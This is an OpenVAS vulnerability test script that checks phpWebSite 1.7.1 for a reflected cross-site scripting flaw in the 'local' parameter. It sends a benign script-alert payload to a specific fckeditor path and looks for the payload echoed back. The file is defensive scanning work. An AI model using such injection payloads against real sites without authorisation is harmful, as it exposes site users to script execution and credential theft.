###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpWebSite_46673.nasl 13 2013-10-27 12:16:33Z jan $
#
# phpWebSite 'local' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "phpWebSite is prone to a cross-site scripting vulnerability because it
fails to properly sanitize user-supplied input.

An attacker may leverage this issue to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This can allow the attacker to steal cookie-based authentication
credentials and launch other attacks.

phpWebSite 1.7.1 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103107);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-03-04 13:25:07 +0100 (Fri, 04 Mar 2011)");
 script_bugtraq_id(46673);
 script_tag(name:"cvss_base", value:"2.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");

 script_name("phpWebSite 'local' Parameter Cross Site Scripting Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46673");
 script_xref(name : "URL" , value : "http://phpwebsite.appstate.edu/");
 script_xref(name : "URL" , value : "http://www.autosectools.com/Advisories/phpWebSite.1.7.1_Reflected.Cross-site.Scripting_131.html");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if phpWebSite is prone to a cross-site scripting vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("gb_phpWebSite_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"phpWebSite"))exit(0);
url = string(dir, "/javascript/editors/fckeditor/editor/custom.php?local=<script>alert(/openvas-xss-test/)</script>"); 

if(http_vuln_check(port:port, url:url,pattern:"<script>alert\(/openvas-xss-test/\)</script>",check_header:TRUE)) {
     
  security_warning(port:port);
  exit(0);

}

exit(0);
